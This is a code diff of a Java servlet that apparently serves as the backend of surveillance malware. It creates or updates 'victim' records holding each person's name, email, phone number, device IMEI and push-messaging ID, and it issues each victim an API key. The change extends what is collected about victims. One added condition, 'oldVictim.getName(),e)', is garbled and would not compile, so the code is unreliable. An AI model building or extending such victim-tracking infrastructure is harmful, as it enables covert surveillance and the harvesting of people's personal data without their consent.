@@ -45,32 +45,46 @@ public class INServlet extends BaseServlet {
 
             final String apiKey;
 
+            //Victim doesn't exists, so create new account
+            final String name = request.getStringParameter(Victims.COLUMN_NAME);
+            final String email = request.getStringParameter(Victims.COLUMN_EMAIL);
+            final String phone = request.getStringParameter(Victims.COLUMN_PHONE);
+
+            //FCM ID may be null
+            String fcmId = request.getStringParameter(Victims.COLUMN_FCM_ID);
+
+            if (fcmId != null && fcmId.isEmpty()) {
+                fcmId = null;
+            }
+
             if (oldVictim == null) {
-
-                //Victim doesn't exists, so create new account
-                final String name = request.getStringParameter(Victims.COLUMN_NAME);
-
-                //FCM ID may be null
-                String fcmId = request.getStringParameter(Victims.COLUMN_FCM_ID);
-                if (fcmId != null && fcmId.isEmpty()) {
-                    fcmId = null;
-                }
 
                 //Preparing new api key for new victim
                 apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
 
-                final Victim newVictim = new Victim(name, imei, apiKey, fcmId);
+                final Victim newVictim = new Victim(name, phone, email, imei, apiKey, fcmId, null);
 
                 victimsTable.addv2(newVictim);
 
             } else {
 
-                final String fcmId = request.getStringParameter(Victims.COLUMN_FCM_ID);
-
-                if (fcmId != null && !fcmId.isEmpty() && !oldVictim.getFCMId().equals(fcmId)) {
-                    //New FCM ID so update
-                    victimsTable.update(Victims.COLUMN_IMEI, imei, Victims.COLUMN_FCM_ID, fcmId);
+                //Setting new values to old victim.
+                if (fcmId != null) {
+                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_FCM_ID, fcmId);
                 }
+
+                if (name != null && !name.isEmpty() && oldVictim.getName(),e) {
+                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_NAME, name);
+                }
+
+                if (email != null && !email.isEmpty()) {
+                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_EMAIL, email);
+                }
+
+                if (phone != null && !phone.isEmpty()) {
+                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_PHONE, phone);
+                }
+
 
                 //Old victim!
                 apiKey = oldVictim.getApiKey();
